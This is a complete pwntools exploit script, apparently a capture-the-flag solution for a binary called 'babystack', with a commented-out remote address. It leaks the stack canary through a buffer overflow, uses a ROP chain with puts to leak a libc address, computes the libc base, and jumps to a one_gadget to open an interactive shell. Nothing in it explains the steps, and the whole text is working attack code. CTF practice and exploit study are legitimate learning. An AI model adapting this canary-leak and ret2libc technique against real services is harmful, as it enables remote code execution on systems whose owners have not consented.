from pwn import *
io=process('./babystack')
#io=remote('220.249.52.133',52361)
elf=ELF('./babystack')
libc=ELF('./libc-2.23.so')

io.sendlineafter('>> ','1')
payload='A'*0x88
io.sendline(payload)

io.sendlineafter('>> ','2')
io.recvuntil('A'*0x88+'\n')
canary=u64(io.recv(7).rjust(8,'\x00'))
print 'canary:'+hex(canary)
rdi_pop=0x400a93
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
main_addr=0x400908
payload='a'*(0x88)+p64(canary)+'a'*8
payload+=p64(rdi_pop)+p64(puts_got)
payload+=p64(puts_plt)+p64(main_addr)
io.sendlineafter('>> ','1')
io.sendline(payload)
io.recv()
io.sendlineafter('>> ','3')
puts_addr=u64(io.recv(8).ljust(8,'\x00'))
print 'puts_addr:'+hex(puts_addr)
base=puts_addr-libc.symbols['puts']
one_gadget_addr=base+0x45216

io.sendlineafter('>> ','1')
payload='a'*(0x88)+p64(canary)+'a'*8+p64(one_gadget_addr)
io.sendline(payload)
io.sendlineafter('>> ','3')
print "end"
io.interactive()